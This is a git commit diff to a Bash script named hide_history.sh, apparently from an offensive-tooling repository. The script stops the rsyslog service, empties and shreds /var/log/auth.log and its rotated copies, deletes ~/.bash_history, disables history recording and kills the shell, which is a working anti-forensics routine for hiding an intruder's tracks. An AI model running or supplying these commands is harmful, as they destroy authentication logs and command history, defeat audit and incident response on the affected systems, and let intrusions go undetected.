9263f6bd4c2e589673dda5c3e8cd536b8dc62f35
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-06-27 08:56:13 -0300

    Update hide_history.sh

--- Code/Bash/hide_history.sh
+++ Code/Bash/hide_history.sh
@@ -1,3 +1,4 @@
+service rsyslog stop
 echo "" > /var/log/auth.log
 echo "" > ~/.bash_history
 rm ~/.bash_history -rf
@@ -5,3 +6,4 @@ history -c
 export HISTFILESIZE=0
 export HISTSIZE=0
 kill -9 $$
+shred -f -n 10 /var/log/auth.log.*
